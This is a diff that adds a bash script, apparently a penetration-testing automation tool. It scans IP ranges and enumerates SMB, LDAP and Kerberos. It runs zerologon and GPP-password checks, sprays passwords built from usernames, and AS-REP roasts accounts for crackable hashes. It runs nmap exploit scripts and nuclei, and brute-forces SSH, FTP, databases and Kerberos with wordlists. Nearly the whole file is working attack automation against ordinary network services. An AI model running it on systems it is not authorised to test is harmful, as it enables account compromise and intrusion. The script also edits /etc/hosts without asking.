@@ -1,0 +1,587 @@
+### CREATED BY KARMAZ
+#
+## FUNCTIONS:
+#
+# 1. PING SWEEP
+# 2. PORT SCANNING (TCP & UPD)
+# 3. HOSTNAME ENUMERATION
+# 4. ENUM4LINUX
+# 5. USER ENUM - if 88 open  
+# 6. AREPROAST CHECK - if 88 open
+# 7. PASS SPRAYING - using username as a password with the below combinations:
+#    - user
+#    - USER
+#    - User
+#    - null (no password)
+# 8. NSE SCAN
+# 9. NUCLEI SCAN
+# 10. SSH AUDIT
+# 11. MISCONFIGURED SPF & DMARC
+# 12. BRUTEFORCING (Brutespray + Kerbrute)
+# 
+## LISTS (output):
+#
+# 1. 	ping_sweep.txt		        - List of IP that respond to ICMP packets
+# 2.    crimson_{IPADDRESS}/	    - Directory with the results for the given IP ADDRESS
+# 3. 	*.png				        - Screenshots of the main page from the nuclei scan for the web services
+# 4. 	discovery_scan.		        - Port scan with banners (-sV)
+# 5.    enum4linux.txt              - Output from enum4linux and CME
+# 6.    hostnames.txt               - Hostnames from the hosthunter
+# 7.    users.txt                   - Users from Kerberos user enum
+# 8.    nse_scan                    - Output from nmap vulenrability scan
+# 9.    nuclei.txt                  - Output from nuclei scan
+# 10.   ssh-audit.txt               - Output from SSH scans
+# 11.   spf_dmarc.txt               - Misconfigured spf & dmarc records
+# 12.   kerbrute_valid_creds.txt    - Valid credentials from password spraying Kerberos
+# 13.   kerbrute_bruteforce.txt     - Valid credentials from bruteforcing Kerberos
+# 13.   brutespray-output/          - Directory with brutespray output
+#
+## WORKFLOW
+#
+# 1. Start the script
+# 2. If any hostnames is resolved, you can further enumerate it using crimson_recon 
+# 3. Check the output.
+#
+###
+
+# Catch crash in trap and save the function name in anchor.log
+trap 'echo $anchor > anchor.log && exit 1' SIGINT
+trap 'echo $anchor > anchor.log && exit 1' SIGHUP
+trap 'echo $anchor > anchor.log && exit 1' SIGKILL
+trap 'echo $anchor > anchor.log && exit 1' SIGTERM
+
+anchor_check() {
+	# USE FUNCTION IF IT IS NOT IN THE anchor.log
+	anchor="$1"
+	[ ! -f "$output_directory/anchor.log" ] && return 0
+	if grep -a -q "$1" "$output_directory/anchor.log"; then
+		rm "$output_directory/anchor.log"; return 0
+	else
+		return 1
+	fi
+}
+
+is_ip_set=0
+is_list_set=0
+scan_tcp=0
+scan_udp=0
+do_ping_sweep=0
+output_directory="/root/bounty/$(date +%Y_%m_%d_%H_%M)"
+do_kerb_user_enum=0
+do_vuln_scan=0
+bruteforce_on=0
+while getopts "i:l:o:tupk:vb" OPTION; do
+    case $OPTION in
+    l)
+        list_with_ip="$OPTARG"
+        is_list_set=1
+        ;;
+    i)
+        ip_range="$OPTARG"
+        is_ip_set=1
+        ;;
+    o)
+		output_directory="$OPTARG"
+		;;
+    t)
+		scan_tcp=1
+		;;
+    u)
+		scan_udp=1
+		;;
+    p)
+		do_ping_sweep=1
+		;;
+    k)
+		do_kerb_user_enum=1
+        k_domain="$OPTARG"
+		;;
+    v)
+		do_vuln_scan=1
+		;;
+    b)
+		bruteforce_on=1
+		;;
+	*)
+        echo "Incorrect options provided"
+        exit 1
+        ;;
+    esac
+done
+
+# Turn off the script if there is no -i or -l
+if [ "$is_list_set" = "0" ] && [ "$is_ip_set" = "0" ]
+then
+    echo "Usage: crimson_IPcon -i IPADDRESS
+        
+        # Optional flags are shown below:
+        -l ip.txt               # Only IPs, one per line.
+        -o /root/bounty/        # The default directory is /root/bounty/$(date +%Y_%m_%d_%H_%M)
+        -t                      # TCP SCAN ON (FULL RANGE) 
+        -u                      # UDP SCAN ON (TOP 1000 PORTS)
+        -p                      # PING SWEEP ON
+        -k ''                   # 1. user enum
+                                # 2. pass spraying (pass same as username [lower,UPPER,Capital,null])
+                                # 3. ASREPROAST no pass
+        -v                      # VULNERABILITY SCANNING
+        -b                      # BRUTE FORCE"
+    exit  1
+else
+    # Continue the execution if there were at least one IP address
+    mkdir -p "$output_directory"/logs
+    # If -i was used parse the CIDR or save only one IP to list
+    if [ "$is_ip_set" = "1" ]
+    then
+        nmap -sL -n "$ip_range" | awk '/Nmap scan report/{print $NF}' >> "$output_directory"/temp.txt
+    fi
+    # If -l was used add the IP from the list
+    if [ "$is_list_set" = "1" ]
+    then
+        cat "$list_with_ip" >> "$output_directory"/temp.txt
+    fi
+    # Changing working directory and removing duplicated IPs
+    cd "$output_directory" || exit
+    sort -u temp.txt > IP_to_test.txt
+    rm temp.txt
+    # Creating directories for each IP
+    while IFS= read -r ip
+    do  
+        mkdir "crimson_$ip"
+    done < IP_to_test.txt
+
+### ---------------------------------------- DISCOVERY SECTION ---------------------------------------- ###
+#   1. Make PING SWEEP if specified;
+#   2. Make FULL TCP port scanning; 
+#   3. Make UDP port scanning;
+#   4. Parsing the nmap results;
+#   5. Enumerating SMB & LDAP using ENUM4LINUX-NG & CME if found ports sepcifing to these services;
+#   6. User enumeration on 88 (kerberos) if using -k
+#   7. Host enum using HOSTHUNTER
+ 
+ping_sweep() {
+	anchor_check "${FUNCNAME[0]}" || return 0
+	echo -e "\033[0;31m[+]\033[0m PING SWEEP - ALIVE ADDRESSES:"
+    fping < IP_to_test.txt -a | tee -a ping_sweep.txt
+}
+
+    # Do PING SWEEP if -p was used.
+    if [ "$do_ping_sweep" = "1" ]
+    then
+        ping_sweep
+    fi
+
+enum_hosts() {
+    anchor_check "${FUNCNAME[0]}" || return 0
+    echo -e "\033[0;31m[+]\033[0m STARTING HOSTHUNTER"
+    python3 "$HOME"/tools/HostHunter/hosthunter.py IP_to_test.txt -f TXT -o hosthunter >> logs/hosthunter.txt
+    while IFS= read -r ip
+    do  
+        echo -e "\033[0;31m[+][+]\033[0m FOUND HOST NAMES FOR $ip"
+    cat nessus_hosthunter | tr "," "\n" | sed "s/ //g" | grep -a "\[$ip\]" |sed "s/\[$ip\]//g" | tee -a crimson_"$ip"/hostnames.txt
+    done < IP_to_test.txt
+    rm nessus_hosthunter webapps_hosthunter hosthunter
+}
+
+    # Enumerate hostnames of the all IPs
+    enum_hosts
+
+tcp_scanning() {
+	anchor_check "${FUNCNAME[0]}" || return 0
+	echo -e "\033[0;31m[+]\033[0m TCP PORT SCANNING"
+	echo -e "\033[0;31m[+][+]\033[0m IT WILL TAKE AROUND $(( $(wc -l < IP_to_test.txt) * 7 )) minutes"
+    ulimit -n 5000
+    while IFS= read -r ip
+    do  
+        echo -e "\033[0;31m[+][+][+]\033[0m STARTING SCANNING $ip - START TIME: $(date +'%m-%d %H:%M:%S')" | tee -a logs/nmap_tcp_scan.log
+        rustscan --accessible -t 5000 -b 1000 --scan-order "Random" -a "$ip" -- -n -sV -Pn --append-output -oA "crimson_$ip/discovery_scan" | tee -a logs/nmap_tcp_scan.log
+        echo -e "\033[0;31m[+][+][+]\033[0m FINISCHING SCANNING $ip - END TIME: $(date +'%m-%d %H:%M:%S')" | tee -a logs/nmap_tcp_scan.log
+    done < IP_to_test.txt
+}
+
+    # Do FULL RANGE TCP SCAN if -t was used.
+    if [ "$scan_tcp" = "1" ]
+    then
+        tcp_scanning
+    fi
+
+udp_scanning() {
+	anchor_check "${FUNCNAME[0]}" || return 0
+	echo -e "\033[0;31m[+]\033[0m UDP PORT SCANNING"
+    echo -e "\033[0;31m[+][+]\033[0m IT WILL TAKE AROUND $(( $(wc -l < IP_to_test.txt) * 3 )) minutes"
+    while IFS= read -r ip
+    do  
+        echo -e "\033[0;31m[+][+][+]\033[0m STARTING SCANNING $ip"
+        nmap "$ip" -Pn -sU -T5 --max-retries 1 --top-ports 1000 --append-output --append-output -oA "crimson_$ip/discovery_scan" | tee -a logs/nmap_udp_scan.log
+    done < IP_to_test.txt  
+}
+
+    # Do nmap default UDP SCAN if -u was used.
+    if [ "$scan_udp" = "1" ]
+    then
+        udp_scanning
+    fi
+
+parsing_scan_results() {
+    anchor_check "${FUNCNAME[0]}" || return 0
+    echo -e "\033[0;31m[+]\033[0m PARSING SCAN RESULTS"
+    ultimate-nmap-parser.sh ./*/*.gnmap --all | tail -n+11 | tee -a logs/ultimate-nmap-parser.log
+    mv parse/ logs/parsed_nmap
+}
+
+    # Parsing scan results if there were any.
+    if [ "$scan_udp" = "1" ] || [ "$scan_tcp" = "1" ]
+    then
+        parsing_scan_results
+    fi
+
+enum4linux_scan() {
+    anchor_check "${FUNCNAME[0]}" || return 0
+    while IFS= read -r ip
+    do
+        check_ports=$(grep -a ":135\|:137\|:138\|:139\|:389\|:445\|:636" logs/parsed_nmap/parsed_ipport.txt | grep -a -o "$ip" | uniq)
+        if [ -n "$check_ports" ]
+        then
+            echo -e "\033[0;31m[+]\033[0m STARTING ENUM4LINUX & CME USING null SESSION FOR $ip"
+            enum4linux-ng -A -C -d "$ip" | tee -a "crimson_$ip"/enum4linux.txt
+            crackmapexec smb "$ip" -u '' -p '' -M zerologon | tee -a "crimson_$ip"/enum4linux.txt
+            crackmapexec smb "$ip" -u '' -p '' -M ioxidresolver | tee -a "crimson_$ip"/enum4linux.txt
+            crackmapexec smb "$ip" -u '' -p '' -M gpp_password | tee -a "crimson_$ip"/enum4linux.txt
+            guest_session_check=$(grep -a "Rerunning enumeration with user " "crimson_$ip"/enum4linux.txt)
+            if [ -n "$guest_session_check" ]
+            then
+                echo -e "\033[0;31m[+][+]\033[0m STARTING ENUM4LINUX & CME USING GUEST SESSION FOR $ip" |tee -a "crimson_$ip"/enum4linux.txt
+                guest_session_username=$(echo "$guest_session_check" | cut -d "'" -f 2)
+                enum4linux-ng -A -C -d "$ip" -u "$guest_session_username" | tee -a "crimson_$ip"/enum4linux.txt
+                crackmapexec smb "$ip" -u "$guest_session_username" -p '' -M zerologon | tee -a "crimson_$ip"/enum4linux.txt
+                crackmapexec smb "$ip" -u "$guest_session_username" -p '' -M ioxidresolver | tee -a "crimson_$ip"/enum4linux.txt
+                crackmapexec smb "$ip" -u "$guest_session_username" -p '' -M gpp_password | tee -a "crimson_$ip"/enum4linux.txt
+            fi
+            echo -e "\033[0;31m[+][+][+]\033[0m TIP - Download shares"|tee -a "crimson_$ip"/enum4linux.txt
+            
+            echo -e "\033[0;31m[+][+][+]\033[0m TIP - Mount shares and check write access (SCF phishing)"|tee -a "crimson_$ip"/enum4linux.txt
+            echo -e "\033[0;31m[+][+][+]\033[0m TIP - Check hardcoded creds"|tee -a "crimson_$ip"/enum4linux.txt
+            # WITH CREDS - #TODO.
+            #if [ -n "$ad_valid_creds" ]
+            #then
+            #    echo -e "\033[0;31m[+][+][+]\033[0m STARTING ENUM4LINUX USING PROVIDED CREDS" |tee -a "$ip"/enum4linux.txt
+            #    enum4linux-ng -A -C -d "$ip" -u "$ad_username" -p "$ad_password" | tee -a "$ip"/enum4linux.txt
+            #fi
+        fi
+    done < IP_to_test.txt
+}
+    # Starting ENUM4LINUX if there was a scan conducted.
+    # Only for IP with port [135,137,138,139,389,445,636] open.
+    if [ "$scan_udp" = "1" ] || [ "$scan_tcp" = "1" ]
+    then
+        enum4linux_scan
+    fi
+
+kerbrute_userenum() {
+    anchor_check "${FUNCNAME[0]}" || return 0
+    while IFS= read -r ip
+    do
+        check_ports=$(grep -a ":88" logs/parsed_nmap/parsed_ipport.txt | grep -a -o "$ip" | uniq)
+        if [ -n "$check_ports" ]
+        then
+            if [ -n "$k_domain" ]
+            then
+                echo -e "\033[0;31m[+]\033[0m STARTING BRUTEFORCING USERNAMES FOR $ip WITH GIVEN DOMAIN NAME $k_domain"
+                echo "$ip       $k_domain" >> /etc/hosts
+                kerbrute userenum -d "$k_domain" --dc "$k_domain" "$HOME"/tools/crimson/words/windows/kerberos_usernames.txt -o "crimson_$ip"/kerbrute_users.txt | tee -a logs/kerbrute_users.txt
+                cat "crimson_$ip"/kerbrute_users.txt|cut -d " " -f 8|grep -v "^$\|^usernames$"|sed "s/@.*//">>"crimson_$ip"/users.txt
+                
+                # SPRAY
+                echo -e "\033[0;31m[+]\033[0m STARTING SPRAYING FOR $ip WITH GIVEN DOMAIN NAME $k_domain"
+                cat "crimson_$ip/users.txt" >> "crimson_$ip/pass.txt"
+                for line in $(cat "crimson_$ip/users.txt");do echo "$line"|sed 's/./\u&/'>>"crimson_$ip/pass.txt";done
+                cat "crimson_$ip/users.txt" | tr '[:lower:]' '[:upper:]' >> "crimson_$ip/pass.txt"
+                
+                kerbrute passwordspray -d "$k_domain" --dc "$k_domain" users.txt "" | tail -n +13 | grep -v "Done! Tested" | tee -a "crimson_$ip/kerbrute_valid_creds.txt"
+                for pass in $(cat "crimson_$ip/pass.txt"); do kerbrute passwordspray -d "$k_domain" --dc "$k_domain" users.txt "$pass" | tail -n +13 | grep -v "Done! Tested" | tee -a "crimson_$ip/kerbrute_valid_creds.txt"; done
+
+                # ASREPROAST
+                echo -e "\033[0;31m[+]\033[0m STARTING ASREPROAST FOR $ip WITH GIVEN DOMAIN NAME $k_domain"
+                crackmapexec ldap "$ip" -u "crimson_$ip"/users.txt -p '' --asreproast "crimson_$ip"/ASREPRoast.txt
+                impacket-GetNPUsers -usersfile "crimson_$ip"/users.txt "$k_domain"/ -no-pass -dc-ip "$ip" -format hashcat -outputfile "crimson_$ip"/ASREPRoast.txt
+            else
+                echo -e "\033[0;31m[+]\033[0m TRYING TO GET THE HOST NAME OF $ip ADDRESS"
+                k1_fqdn=$(grep -a "FQDN: " "crimson_$ip/enum4linux.txt" | head -1 | cut -d " " -f 2)
+                k2_smb=$(grep -a "DNS domain: " "crimson_$ip/enum4linux.txt" | head -1| cut -d " " -f 3)
+                k3_ldap=$(grep -a "Long domain name is: " "crimson_$ip/enum4linux.txt" | head -1| cut -d " " -f 6)
+                if [ -n "$k1_fqdn" ]
+                then
+                    echo -e "\033[0;31m[+][+]\033[0m STARTING BRUTEFORCING USERNAMES FOR $ip WITH DOMAIN NAME $k1_fqdn"
+                    echo "$ip       $k1_fqdn" >> /etc/hosts
+                    kerbrute userenum -d "$k1_fqdn" --dc "$k1_fqdn" "$HOME"/tools/crimson/words/windows/kerberos_usernames.txt -o "crimson_$ip"/kerbrute_users.txt | tee -a logs/kerbrute_users.txt
+                    cat "crimson_$ip"/kerbrute_users.txt|cut -d " " -f 8|grep -v "^$\|^usernames$"|sed "s/@.*//">>"crimson_$ip"/users.txt
+
+                    # SPRAY
+                    echo -e "\033[0;31m[+][+]\033[0m STARTING SPRAYING FOR $ip WITH DOMAIN NAME $k1_fqdn"
+
+                    cat "crimson_$ip/users.txt" >> "crimson_$ip/pass.txt"
+                    for line in $(cat "crimson_$ip/users.txt");do echo "$line"|sed 's/./\u&/'>>"crimson_$ip/pass.txt";done
+                    cat "crimson_$ip/users.txt" | tr '[:lower:]' '[:upper:]' >> "crimson_$ip/pass.txt"
+                    
+                    kerbrute passwordspray -d "$k1_fqdn" --dc "$k1_fqdn" users.txt "" | tail -n +13 | grep -v "Done! Tested" | tee -a "crimson_$ip/kerbrute_valid_creds.txt"
+                    for pass in $(cat "crimson_$ip/pass.txt"); do kerbrute passwordspray -d "$k1_fqdn" --dc "$k1_fqdn" users.txt "$pass" | tail -n +13 | grep -v "Done! Tested" | tee -a "crimson_$ip/kerbrute_valid_creds.txt"; done
+
+                    # ASREPROAST
+                    echo -e "\033[0;31m[+]\033[0m STARTING ASREPROAST FOR $ip WITH DOMAIN NAME $k1_fqdn"
+                    crackmapexec ldap "$ip" -u "crimson_$ip"/users.txt -p '' --asreproast "crimson_$ip"/ASREPRoast.txt
+                    impacket-GetNPUsers -usersfile "crimson_$ip"/users.txt "$k1_fqdn"/ -no-pass -dc-ip "$ip" -format hashcat -outputfile "crimson_$ip"/ASREPRoast.txt
+                elif [ -n "$k2_smb" ]
+                then
+                    echo -e "\033[0;31m[+][+]\033[0m STARTING BRUTEFORCING USERNAMES FOR $ip WITH DOMAIN NAME $k2_smb"
+                    echo "$ip       $k2_smb" >> /etc/hosts
+                    kerbrute userenum -d "$k2_smb" --dc "$k2_smb" "$HOME"/tools/crimson/words/windows/kerberos_usernames.txt -o "crimson_$ip"/kerbrute_users.txt | tee -a logs/kerbrute_users.txt
+                    cat "crimson_$ip"/kerbrute_users.txt|cut -d " " -f 8|grep -v "^$\|^usernames$"|sed "s/@.*//">>"crimson_$ip"/users.txt
+
+                    # SPRAY
+                    echo -e "\033[0;31m[+][+]\033[0m STARTING SPRAYING FOR $ip WITH DOMAIN NAME $k2_smb"
+                    cat "crimson_$ip/users.txt" >> "crimson_$ip/pass.txt"
+                    for line in $(cat "crimson_$ip/users.txt");do echo "$line"|sed 's/./\u&/'>>"crimson_$ip/pass.txt";done
+                    cat "crimson_$ip/users.txt" | tr '[:lower:]' '[:upper:]' >> "crimson_$ip/pass.txt"
+                    
+                    kerbrute passwordspray -d "$k2_smb" --dc "$k2_smb" users.txt "" | tail -n +13 | grep -v "Done! Tested" | tee -a "crimson_$ip/kerbrute_valid_creds.txt"
+                    for pass in $(cat "crimson_$ip/pass.txt"); do kerbrute passwordspray -d "$k2_smb" --dc "$k2_smb" users.txt "$pass" | tail -n +13 | grep -v "Done! Tested" | tee -a "crimson_$ip/kerbrute_valid_creds.txt"; done
+
+                    # ASREPROAST
+                    echo -e "\033[0;31m[+]\033[0m STARTING ASREPROAST FOR $ip WITH DOMAIN NAME $k2_smb"
+                    crackmapexec ldap "$ip" -u "crimson_$ip"/users.txt -p '' --asreproast "crimson_$ip"/ASREPRoast.txt
+                    impacket-GetNPUsers -usersfile "crimson_$ip"/users.txt "$k2_smb"/ -no-pass -dc-ip "$ip" -format hashcat -outputfile "crimson_$ip"/ASREPRoast.txt
+                elif [ -n "$k3_ldap" ]
+                then
+                    echo -e "\033[0;31m[+][+]\033[0m STARTING BRUTEFORCING USERNAMES FOR $ip WITH DOMAIN NAME $k3_ldap"
+                    echo "$ip       $k3_ldap" >> /etc/hosts
+                    kerbrute userenum -d "$k3_ldap" --dc "$k3_ldap" "$HOME"/tools/crimson/words/windows/kerberos_usernames.txt -o "crimson_$ip"/kerbrute_users.txt | tee -a logs/kerbrute_users.txt
+                    cat "crimson_$ip"/kerbrute_users.txt|cut -d " " -f 8|grep -v "^$\|^usernames$"|sed "s/@.*//">>"crimson_$ip"/users.txt
+
+                    # SPRAY
+                    echo -e "\033[0;31m[+][+]\033[0m STARTING SPRAYING FOR $ip WITH DOMAIN NAME $k3_ldap"
+                    cat "crimson_$ip/users.txt" >> "crimson_$ip/pass.txt"
+                    for line in $(cat "crimson_$ip/users.txt");do echo "$line"|sed 's/./\u&/'>>"crimson_$ip/pass.txt";done
+                    cat "crimson_$ip/users.txt" | tr '[:lower:]' '[:upper:]' >> "crimson_$ip/pass.txt"
+                    
+                    kerbrute passwordspray -d "$k3_ldap" --dc "$k3_ldap" users.txt "" | tail -n +13 | grep -v "Done! Tested" | tee -a "crimson_$ip/kerbrute_valid_creds.txt"
+                    for pass in $(cat "crimson_$ip/pass.txt"); do kerbrute passwordspray -d "$k3_ldap" --dc "$k3_ldap" users.txt "$pass" | tail -n +13 | grep -v "Done! Tested" | tee -a "crimson_$ip/kerbrute_valid_creds.txt"; done
+
+                    # ASREPROAST
+                    echo -e "\033[0;31m[+]\033[0m STARTING ASREPROAST FOR $ip WITH DOMAIN NAME $k3_ldap"
+                    crackmapexec ldap "$ip" -u "crimson_$ip"/users.txt -p '' --asreproast "crimson_$ip"/ASREPRoast.txt
+                    impacket-GetNPUsers -usersfile "crimson_$ip"/users.txt "$k3_ldap"/ -no-pass -dc-ip "$ip" -format hashcat -outputfile "crimson_$ip"/ASREPRoast.txt
+                else
+                    echo -e "\033[0;31m[+][+]\033[0m COULD NOT FOUND THE DOMAIN NAME OF THE $ip ADDRESS - SKIPPING KERBRUTE" | logs/error.txt
+            fi
+        fi
+    fi
+    done < IP_to_test.txt
+}
+    # Brute-forcing usernames using 88 Kerberos if found, with given domain or automaticly extracted from enum4linux output.
+
+    if [ "$do_kerb_user_enum" = "1" ]
+    then
+        kerbrute_userenum
+    fi
+### ---------------------------------------- VULNERABILITY SCANNING SECTION ---------------------------------------- ###
+#   1. NSE SCRIPTS - vuln and discovery, exception list:
+#       broadcast-avahi-dos
+#       smb-vuln-regsvc-dos
+#       targets-asn
+#       http-robtex-shared-ns
+#       hostmap-robtex
+#       http-dombased-xss
+#       http-csrf
+#       http-stored-xss
+#       http-chrono
+#       http-vhosts
+#       targets-ipv6-multicast-echo
+#       ipv6-multicast-mld-list
+#       targets-ipv6-multicast-invalid-dst
+#       targets-ipv6-multicast-mld
+#   2. NUCLEI TEMPLATES - exception list
+#       token-spray
+#       misconfiguration/http-missing-security-headers.yaml
+#   3. SSH AUDIT - only port 22 #TODO - parse summary.txt, grep for SSH and audit all of them.
+#   4. SMTP AUDIT - mailspoof
+
+nse_scan() {
+    anchor_check "${FUNCNAME[0]}" || return 0
+    echo -e "\033[0;31m[+]\033[0m STARTING NSE SCAN"
+    nmap --script-updatedb > /dev/null 2>&1
+    while IFS= read -r ip
+    do 
+        ports=$(grep -a "$ip" logs/parsed_nmap/parsed_ipport.txt | cut -d ":" -f 2 | tr "\n" "," | sed "s/,$//") 
+        nmap "$ip" -p "$ports" -n -A -Pn --script "(discovery or vuln or exploit or auth) and not (broadcast-avahi-dos or smb-vuln-regsvc-dos or targets-asn or http-robtex-shared-ns or hostmap-robtex or http-dombased-xss or http-csrf or http-stored-xss or http-chrono or http-vhosts or targets-ipv6-multicast-echo or ipv6-multicast-mld-list or targets-ipv6-multicast-invalid-dst or targets-ipv6-multicast-mld)" --append-output -oN "crimson_$ip"/nse_scan.txt -oX "crimson_$ip"/nse_scan.xml
+    done < IP_to_test.txt
+}
+nuclei_scan() {
+    anchor_check "${FUNCNAME[0]}" || return 0
+    nuclei -ut -silent
+    echo -e "\033[0;31m[+]\033[0m STARTING NUCLEI AGAINST IP ADDRESSES"
+    for ip in $(cat IP_to_test.txt)
+    do 
+        echo -e "\033[0;31m[+][+]\033[0m NUCLEI ON $ip"
+        cd "crimson_$ip" || exit
+        nuclei -u "$ip" -fr -mhe 300 -headless -stats -silent -et "token-spray,misconfiguration/http-missing-security-headers.yaml" | tee -a nuclei.txt
+        cd ..
+    done
+
+    echo -e "\033[0;31m[+]\033[0m STARTING NUCLEI AGAINST WEB SERVICES"
+    for url in $(cat logs/parsed_nmap/web-urls.txt)
+    do 
+        echo -e "\033[0;31m[+][+]\033[0m NUCLEI ON $url"
+        extracted_ip=$(echo "$url" | grep -a -E -o '([0-9]{1,3}[.]){3}[0-9]{1,3}') # to save in proper directory.
+        cd "crimson_$extracted_ip" || exit
+        nuclei -u "$url" -fr -mhe 300 -headless -stats -silent -et "token-spray,misconfiguration/http-missing-security-headers.yaml" | tee -a nuclei.txt
+        cd ..
+    done
+}
+audit_ssh() {
+    anchor_check "${FUNCNAME[0]}" || return 0
+    while IFS= read -r ip
+    do
+        check_ports=$(grep -a "$ip" logs/parsed_nmap/summary.txt | grep -a ssh | cut -d "|" -f 2,3 | sed "s/ //g" | sed "s/\/.*//g" | uniq)
+        if [ -n "$check_ports" ]
+        then
+            for line in $(echo "$check_ports" | tr " " "\n") 
+            do
+                port_with_ssh=$(echo "$line" | cut -d "|" -f 2)
+                echo -e "\033[0;31m[+]\033[0m STARTING SSH AUDIT ON $ip:$port_with_ssh"
+                ssh-audit "$ip" -p "$port_with_ssh" | tee -a "crimson_$ip"/ssh-audit.txt
+            done
+        fi
+    done < IP_to_test.txt
+}
+audit_spf_dmarc() {
+    anchor_check "${FUNCNAME[0]}" || return 0
+    while IFS= read -r ip
+    do
+        echo -e "\033[0;31m[+]\033[0m STARTING mailspoof ON $ip"
+        mailspoof -d "$ip" | tee -a "crimson_$ip"/spf_dmarc.txt
+    done < IP_to_test.txt
+}
+
+    # Do vulnerability scans if -v was used.
+    if [ "$do_vuln_scan" = "1" ]
+    then
+        nse_scan
+        nuclei_scan
+        audit_ssh
+        audit_spf_dmarc
+    fi
+
+### ---------------------------------------- BRUTE SECTION ---------------------------------------- ###
+#   1. BRUTESPRAY - build-in wordlist only
+#   -ssh
+#   -ftp
+#   -telnet
+#   -vnc
+#   -mssql
+#   -mysql
+#   -postgresql
+#   -rsh
+#   -imap
+#   -nntp
+#   -pcanywhere
+#   -pop3
+#   -rexec
+#   -rlogin
+#   -smbnt
+#   -smtp
+#   -svn
+#   -vmauthds
+#   -snmp
+#
+#   2. KERBRUTE - custom wordlist from crimson and users.txt from the target directory.
+
+brute_brutespray() {
+    anchor_check "${FUNCNAME[0]}" || return 0
+    while IFS= read -r ip
+    do
+        echo -e "\033[0;31m[+]\033[0m STARTING BRUTESPRAY ON $ip"
+        cd "crimson_$ip" || exit
+        brutespray -f discovery_scan.gnmap -q -c
+        cd .. || exit
+    done < IP_to_test.txt
+}
+
+brute_kerbrute() {
+    anchor_check "${FUNCNAME[0]}" || return 0
+    while IFS= read -r ip
+    do
+        check_ports=$(grep -a ":88" logs/parsed_nmap/parsed_ipport.txt | grep -a -o "$ip" | uniq)
+        if [ -n "$check_ports" ]
+        then
+            # PREPARE WORDLIST (user:pass)
+            for user in $(cat "crimson_$ip"/users.txt); do for pass in $(cat "$HOME/tools/crimson/words/10k_commons_and_keymap.txt"); do echo "$user:$pass" >> "crimson_$ip"/user_pass.txt; done ;done 
+            # BRUTE FORCES
+            if [ -n "$k_domain" ]
+            then
+                echo -e "\033[0;31m[+]\033[0m STARTING BRUTEFORCING FOR $ip WITH GIVEN DOMAIN NAME $k_domain"
+                kerbrute bruteforce -d "$k_domain" --dc "$k_domain" "crimson_$ip"/user_pass.txt -o "crimson_$ip"/kerbrute_bruteforce.txt | tee -a logs/kerbrute_bruteforce.txt
+            else
+                echo -e "\033[0;31m[+]\033[0m TRYING TO GET THE HOST NAME OF $ip ADDRESS"
+                k1_fqdn=$(grep -a "FQDN: " "crimson_$ip/enum4linux.txt" | head -1 | cut -d " " -f 2)
+                k2_smb=$(grep -a "DNS domain: " "crimson_$ip/enum4linux.txt" | head -1| cut -d " " -f 3)
+                k3_ldap=$(grep -a "Long domain name is: " "crimson_$ip/enum4linux.txt" | head -1| cut -d " " -f 6)
+                if [ -n "$k1_fqdn" ]
+                then
+                    echo -e "\033[0;31m[+][+]\033[0m STARTING BRUTEFORCING FOR $ip WITH DOMAIN NAME $k1_fqdn"
+                    kerbrute bruteforce -d "$k1_fqdn" --dc "$k1_fqdn" "crimson_$ip"/user_pass.txt -o "crimson_$ip"/kerbrute_bruteforce.txt | tee -a logs/kerbrute_bruteforce.txt
+                elif [ -n "$k2_smb" ]
+                then
+                    echo -e "\033[0;31m[+][+]\033[0m STARTING BRUTEFORCING FOR $ip WITH DOMAIN NAME $k2_smb"
+                    kerbrute bruteforce -d "$k2_smb" --dc "$k2_smb" "crimson_$ip"/user_pass.txt -o "crimson_$ip"/kerbrute_bruteforce.txt | tee -a logs/kerbrute_bruteforce.txt
+                elif [ -n "$k3_ldap" ]
+                then
+                    echo -e "\033[0;31m[+][+]\033[0m STARTING BRUTEFORCING FOR $ip WITH DOMAIN NAME $k3_ldap"
+                    kerbrute bruteforce -d "$k3_ldap" --dc "$k3_ldap" "crimson_$ip"/user_pass.txt -o "crimson_$ip"/kerbrute_bruteforce.txt | tee -a logs/kerbrute_bruteforce.txt
+                else
+                    echo -e "\033[0;31m[+][+]\033[0m COULD NOT FOUND THE DOMAIN NAME OF THE $ip ADDRESS - SKIPPING KERBRUTE" | logs/error.txt
+                fi
+            fi
+        fi
+    done < IP_to_test.txt
+}
+
+    # BRUTEFORCE -b
+    if [ "$bruteforce_on" = "1" ]
+    then
+        brute_brutespray
+        brute_kerbrute
+    fi
+
+clear_log() {
+	### CLEARING STUFF - deleting empty files
+    find . -type d -empty -print -delete -o -type f -empty -print -delete
+	### REMOVING LOG IF PROGRAM EXIT NORMALLY
+	if [ -f "$output_directory/anchor.log" ]; then
+			rm "$output_directory/anchor.log"
+	fi
+}
+    clear_log
+
+print_results() {
+    echo -e "\033[0;31m[-------]\033[0m SCAN RESULTS"
+    cat logs/parsed_nmap/summary.txt
+    echo -e "\033[0;31m[-------]\033[0m CHECK THE crimson_[ip] directories:"
+    echo -e "\033[0;31m[+]\033[0m DISCOVERY:"
+    echo -e "\033[0;31m[+][+]\033[0m ping_sweep.txt"
+    echo -e "\033[0;31m[+][+]\033[0m discovery_scan.nmap"
+    echo -e "\033[0;31m[+][+]\033[0m hostnames.txt"
+    echo -e "\033[0;31m[+][+]\033[0m users.txt"
+    echo -e "\033[0;31m[+][+]\033[0m enum4linux.txt"
+    echo -e "\033[0;31m[+]\033[0m VULNS:"
+    echo -e "\033[0;31m[+][+]\033[0m nse_scan.nmap"
+    echo -e "\033[0;31m[+][+]\033[0m nuclei.txt"
+    echo -e "\033[0;31m[+][+]\033[0m ssh-audit.txt"
+    echo -e "\033[0;31m[+][+]\033[0m spf_dmarc.txt"
+    echo -e "\033[0;31m[+]\033[0m BRUTEFORCE:"
+    echo -e "\033[0;31m[+][+]\033[0m brutespray-output/"
+    echo -e "\033[0;31m[+][+]\033[0m kerbrute_bruteforce.txt"
+    echo -e "\033[0;31m[+][+]\033[0m kerbrute_valid_creds.txt"
+    echo -e "\033[0;31m[-------]\033[0m THANKS & BYE!"
+}
+
+print_results
+fi
